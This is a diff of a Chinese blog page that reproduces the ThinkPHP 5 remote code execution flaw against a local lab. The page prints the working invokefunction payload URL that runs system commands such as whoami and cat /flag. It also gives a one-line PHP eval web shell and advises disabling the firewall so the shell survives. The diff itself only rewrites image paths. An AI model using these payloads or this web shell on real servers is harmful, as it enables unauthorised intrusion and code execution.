@@ -31,23 +31,23 @@
 <meta property="og:site_name" content="阿卡丽的黑心商店">
 <meta property="og:description" content="基于对RCE的学习，对著名的thinkphpv5进行漏洞复现">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/thinkphp5/11.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/thinkphp5/2.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/thinkphp5/3.png">
-<meta property="og:image" content="http://example.com/thinkphp5/4.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/thinkphp5/5.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/thinkphp5/6.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/thinkphp5/7.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/thinkphp5/8.png">
-<meta property="og:image" content="http://example.com/thinkphp5/9.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/thinkphp5/10.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/11.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/2.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/3.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/4.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/5.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/6.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/7.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/8.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/9.png">
+<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/10.png">
 <meta property="article:published_time" content="2022-08-11T04:33:07.955Z">
 <meta property="article:modified_time" content="2022-08-11T06:31:51.551Z">
 <meta property="article:author" content="akali">
 <meta property="article:tag" content="网络攻防">
 <meta property="article:tag" content="PHP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/08/11/thinkphp5/thinkphp5/11.png">
+<meta name="twitter:image" content="http://example.com/2022/08/11/thinkphp5/11.png">
 
 <link rel="canonical" href="http://example.com/2022/08/11/thinkphp5/">
 
@@ -230,16 +230,16 @@
         <p> 基于对RCE的学习，对著名的thinkphpv5进行漏洞复现</p>
 <span id="more"></span>
 
-<h2 id="搭建ThinkPHP-V5框架"><a href="#搭建ThinkPHP-V5框架" class="headerlink" title="搭建ThinkPHP V5框架"></a>搭建ThinkPHP V5框架</h2><p>首先搭建ThinkPHP V5框架，搭建过程可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jack_num1/article/details/105918659">thinkphp5环境搭建</a><br><img src="thinkphp5/11.png" alt="image-20220811103850543" style="zoom:50%;" /><img src="thinkphp5/2.png" alt="image-20220811104224203" style="zoom:50%;" /><br>在这个页面中可以看到并没有靶场给的那么明显的输入框，那么唯一的输入框就是ip地址的输入框</p>
-<h2 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h2><p>进行注入尝试<br>输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php？s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;whoami<br>即在原地址后插入了从？s到whoami的命令。因为该框架是基于php语言构建所以可以执行linux命令<br>输出：<img src="thinkphp5/3.png" alt="image-20220805090923902" style="zoom:80%;" /></p>
-<h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><p>可以看到是存在命令执行漏洞的，尝试写入shell（后门木马）<br>输入：<img src="/thinkphp5/4.png" alt="image-20220805090936740"><br>可以在thinkphpv5安装的地址中找到shell.php文件，推荐进行这步关闭防火墙，因为即便shell.php文件是空的，系统仍会警告然后删掉<br>输出：</p>
-<img src="thinkphp5/5.png" alt="image-20220805090958493" style="zoom:67%;" />
+<h2 id="搭建ThinkPHP-V5框架"><a href="#搭建ThinkPHP-V5框架" class="headerlink" title="搭建ThinkPHP V5框架"></a>搭建ThinkPHP V5框架</h2><p>首先搭建ThinkPHP V5框架，搭建过程可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jack_num1/article/details/105918659">thinkphp5环境搭建</a><br><img src="/2022/08/11/thinkphp5/11.png" alt="image-20220811103850543" style="zoom:50%;"><img src="/2022/08/11/thinkphp5/2.png" alt="image-20220811104224203" style="zoom:50%;"><br>在这个页面中可以看到并没有靶场给的那么明显的输入框，那么唯一的输入框就是ip地址的输入框</p>
+<h2 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h2><p>进行注入尝试<br>输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php？s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;whoami<br>即在原地址后插入了从？s到whoami的命令。因为该框架是基于php语言构建所以可以执行linux命令<br>输出：<img src="/2022/08/11/thinkphp5/3.png" alt="image-20220805090923902" style="zoom:80%;"></p>
+<h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><p>可以看到是存在命令执行漏洞的，尝试写入shell（后门木马）<br>输入：<img src="/2022/08/11/thinkphp5/4.png" alt="image-20220805090936740"><br>可以在thinkphpv5安装的地址中找到shell.php文件，推荐进行这步关闭防火墙，因为即便shell.php文件是空的，系统仍会警告然后删掉<br>输出：</p>
+<img src="/2022/08/11/thinkphp5/5.png" alt="image-20220805090958493" style="zoom:67%;">
 
 <p><strong>注意:需要对特殊字符使用^转义(cmd环境下转义方式),windows环境的echo命令输出字符串到文档不<br>用引号(单引号、双引号),部分字符url编码不编码都行。</strong><br>shell.php文件内容为&lt;?php @eval($_POST[cmd];?)</p>
-<h2 id="夺旗"><a href="#夺旗" class="headerlink" title="夺旗"></a>夺旗</h2><p>(1)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;<br>输出：<img src="thinkphp5/6.png" alt="image-20220805091029303" style="zoom:80%;" /></p>
-<p>(2)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;flag<br>输出：<img src="thinkphp5/7.png" alt="image-20220805091043757" style="zoom:80%;" /></p>
-<p>(3)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;cat &#x2F;flag<br>输出：<img src="thinkphp5/8.png" alt="image-20220805091100781" style="zoom:80%;" /></p>
-<h2 id="通过phpinfo函数查看phpinfo-信息"><a href="#通过phpinfo函数查看phpinfo-信息" class="headerlink" title="通过phpinfo函数查看phpinfo()信息"></a>通过phpinfo函数查看phpinfo()信息</h2><h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：<img src="/thinkphp5/9.png" alt="image-20220805091120896"></h3><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：<img src="thinkphp5/10.png" alt="image-20220805091130347" style="zoom:80%;" /></h3><hr>
+<h2 id="夺旗"><a href="#夺旗" class="headerlink" title="夺旗"></a>夺旗</h2><p>(1)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;<br>输出：<img src="/2022/08/11/thinkphp5/6.png" alt="image-20220805091029303" style="zoom:80%;"></p>
+<p>(2)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;flag<br>输出：<img src="/2022/08/11/thinkphp5/7.png" alt="image-20220805091043757" style="zoom:80%;"></p>
+<p>(3)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;cat &#x2F;flag<br>输出：<img src="/2022/08/11/thinkphp5/8.png" alt="image-20220805091100781" style="zoom:80%;"></p>
+<h2 id="通过phpinfo函数查看phpinfo-信息"><a href="#通过phpinfo函数查看phpinfo-信息" class="headerlink" title="通过phpinfo函数查看phpinfo()信息"></a>通过phpinfo函数查看phpinfo()信息</h2><h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：<img src="/2022/08/11/thinkphp5/9.png" alt="image-20220805091120896"></h3><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：<img src="/2022/08/11/thinkphp5/10.png" alt="image-20220805091130347" style="zoom:80%;"></h3><hr>
 <p>相关源码部分正在学习，之后补上，可别忘了</p>
 
     </div>
